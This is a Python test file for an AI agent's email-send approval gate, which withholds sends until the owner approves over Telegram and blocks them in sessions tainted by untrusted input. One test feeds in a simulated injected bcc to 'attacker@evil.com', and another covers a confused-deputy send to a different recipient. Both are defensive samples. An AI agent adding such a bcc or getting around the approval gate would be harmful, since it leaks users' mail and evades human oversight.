"""Confirm-approval round-trip — overlay runtime tests (ADR 0071 / #1806).

Two layers:

* the approval-capture matcher (``approval.py``) — the strict, allowlist-gated,
  bare-affirmative recognizer that marks the single pending send approved;
* the end-to-end gate (``evaluate_tool_call``) — a send at the confirm ceiling is
  WITHHELD and captured, a matching current-turn approval releases the STORED
  payload (replayed over drift), and the invariants hold: recipient-bound consume,
  single-use, and the taint-gate still dominating.
"""

from __future__ import annotations

import pytest

from shared.inbound import SESSION_TAINT, TRUST_CLASS_UNKNOWN_EXTERNAL
from shared.outbound_recipient import DRAFT_RECIPIENTS
from shared.pending_send import PENDING_SEND
from tests.conftest import load_plugin

ALLOWED = "7367659986"
ROSTER = ["scott@smd.services"]  # the test send target (client@example.com) is OUTSIDE


def _trust():
    return load_plugin("hermes-smd-trust")


def _load_enforce():
    return _trust().enforce


def _load_approval():
    return _trust().approval


@pytest.fixture(autouse=True)
def _clean_state(monkeypatch):
    PENDING_SEND.clear()
    DRAFT_RECIPIENTS._by_key.clear()
    SESSION_TAINT._tainted.clear()
    monkeypatch.setenv("TELEGRAM_ALLOWED_USERS", ALLOWED)
    yield
    PENDING_SEND.clear()
    DRAFT_RECIPIENTS._by_key.clear()
    SESSION_TAINT._tainted.clear()


def _setup_confirm(monkeypatch, enforce):
    """Persona exposure: external_send authored at the confirm ceiling."""
    monkeypatch.setattr(
        enforce,
        "_resolve_persona_exposure",
        lambda slug="": {enforce.ActionClass.EXTERNAL_SEND: enforce.Ceiling.CONFIRM},
    )
    monkeypatch.setattr(enforce, "_resolve_roster", lambda: list(ROSTER))
    monkeypatch.setattr(enforce, "_resolve_vertical_floors", lambda: {})
    monkeypatch.setenv("HERMES_ACTIVE_PROFILE", "agent-crane")


# ---------------------------------------------------------------------------
# approval matcher (approval.py)
# ---------------------------------------------------------------------------


def test_is_bare_affirmative_accepts_natural_phrasings():
    approval = _load_approval()
    for msg in ["Yes, send it", "yes send it", "Approve.", "send it now", "CONFIRM"]:
        assert approval.is_bare_affirmative(msg) is True, msg


def test_is_bare_affirmative_rejects_conditional_negation_and_noise():
    approval = _load_approval()
    for msg in [
        "yes but change the price to $5k",  # conditional — must NOT approve old content
        "no send it",  # negation
        "don't send that yet",
        "please send the report to bob",  # a task that merely contains 'send'
        "yesss",
        "",
        "   ",
    ]:
        assert approval.is_bare_affirmative(msg) is False, msg


def test_maybe_capture_requires_telegram_allowlisted_sender_and_pending():
    approval = _load_approval()
    # Nothing pending → no-op even for a valid approval.
    assert approval.maybe_capture_approval("telegram", ALLOWED, "yes send it") is None

    PENDING_SEND.capture("mcp_agentmail_send_message", {"to": "x@y.com"}, {"x@y.com"})
    # Wrong platform.
    assert approval.maybe_capture_approval("slack", ALLOWED, "yes send it") is None
    # Non-allowlisted sender.
    assert approval.maybe_capture_approval("telegram", "999", "yes send it") is None
    # Not a bare affirmative.
    assert approval.maybe_capture_approval("telegram", ALLOWED, "maybe later") is None
    # Valid → marks approved, returns the source.
    assert (
        approval.maybe_capture_approval("telegram", ALLOWED, "yes send it") == f"telegram:{ALLOWED}"
    )
    assert PENDING_SEND.peek().approved is True


# ---------------------------------------------------------------------------
# end-to-end gate: withhold + capture -> approve -> replay stored payload
# ---------------------------------------------------------------------------


def test_confirm_send_withholds_and_captures(monkeypatch):
    enforce = _load_enforce()
    _setup_confirm(monkeypatch, enforce)
    result = enforce.evaluate_tool_call(
        "mcp_agentmail_send_message",
        {"to": ["client@example.com"], "subject": "Report", "text": "reviewed body"},
        "smd",
        session_id="s1",
    )
    assert result is not None and result["action"] == "block"
    assert "withheld pending" in result["message"].lower()
    rec = PENDING_SEND.peek()
    assert rec is not None and rec.recipients == frozenset({"client@example.com"})
    assert rec.approved is False


def test_approval_releases_stored_payload_over_drift(monkeypatch):
    enforce = _load_enforce()
    approval = _load_approval()
    _setup_confirm(monkeypatch, enforce)
    # Turn 1: compose + withhold (captures the reviewed body).
    enforce.evaluate_tool_call(
        "mcp_agentmail_send_message",
        {"to": ["client@example.com"], "subject": "Report", "text": "the reviewed body"},
        "smd",
        session_id="s1",
    )
    # Turn 2: the owner approves over Telegram.
    assert (
        approval.maybe_capture_approval("telegram", ALLOWED, "Yes, send it")
        == f"telegram:{ALLOWED}"
    )
    # Turn 2: the LLM re-invokes with a DRIFTED body + an injected bcc.
    live_args = {
        "to": ["client@example.com"],
        "subject": "Report (reworded)",
        "text": "a DIFFERENT regenerated body",
        "bcc": ["attacker@evil.com"],
    }
    result = enforce.evaluate_tool_call(
        "mcp_agentmail_send_message", live_args, "smd", session_id="s1"
    )
    assert result is None  # allowed — the send ships
    # The STORED payload replaced the live args verbatim: reviewed body, no bcc.
    assert live_args["text"] == "the reviewed body"
    assert live_args["subject"] == "Report"
    assert "bcc" not in live_args
    # Single-use: the approval is consumed.
    assert PENDING_SEND.peek() is None


def test_no_approval_still_withholds(monkeypatch):
    enforce = _load_enforce()
    _setup_confirm(monkeypatch, enforce)
    enforce.evaluate_tool_call(
        "mcp_agentmail_send_message",
        {"to": ["client@example.com"], "text": "body"},
        "smd",
        session_id="s1",
    )
    # Re-invoke without any approval → still withheld.
    result = enforce.evaluate_tool_call(
        "mcp_agentmail_send_message",
        {"to": ["client@example.com"], "text": "body"},
        "smd",
        session_id="s1",
    )
    assert result is not None and result["action"] == "block"
    assert "withheld pending" in result["message"].lower()


def test_approval_does_not_release_a_different_recipient(monkeypatch):
    enforce = _load_enforce()
    approval = _load_approval()
    _setup_confirm(monkeypatch, enforce)
    enforce.evaluate_tool_call(
        "mcp_agentmail_send_message",
        {"to": ["client@example.com"], "text": "body"},
        "smd",
        session_id="s1",
    )
    approval.maybe_capture_approval("telegram", ALLOWED, "yes send it")
    # The confused-deputy case: after approving the client send, the agent tries a
    # send to a DIFFERENT recipient. It must be WITHHELD (it never inherits the
    # client's approval) — a new compose supersedes the prior pending, unapproved.
    result = enforce.evaluate_tool_call(
        "mcp_agentmail_send_message",
        {"to": ["someone-else@example.com"], "text": "body"},
        "smd",
        session_id="s1",
    )
    assert result is not None and result["action"] == "block"  # not sent
    # B did not inherit A's approval (single-outstanding-pending superseded it).
    assert (
        PENDING_SEND.has_approved_match("mcp_agentmail_send_message", {"someone-else@example.com"})
        is False
    )


def test_taint_dominates_confirm_approval(monkeypatch):
    enforce = _load_enforce()
    approval = _load_approval()
    _setup_confirm(monkeypatch, enforce)
    # Capture + approve on a clean session.
    enforce.evaluate_tool_call(
        "mcp_agentmail_send_message",
        {"to": ["client@example.com"], "text": "body"},
        "smd",
        session_id="s-clean",
    )
    approval.maybe_capture_approval("telegram", ALLOWED, "yes send it")
    # Re-invoke on a TAINTED session — even with a valid approval, taint refuses
    # the send before the confirm branch, and the approval is NOT consumed.
    SESSION_TAINT.mark("s-tainted", TRUST_CLASS_UNKNOWN_EXTERNAL)
    result = enforce.evaluate_tool_call(
        "mcp_agentmail_send_message",
        {"to": ["client@example.com"], "text": "body"},
        "smd",
        session_id="s-tainted",
    )
    assert result is not None and result["action"] == "block"
    assert "untrusted inbound" in result["message"].lower()
    assert PENDING_SEND.peek() is not None  # approval preserved, not burned by taint
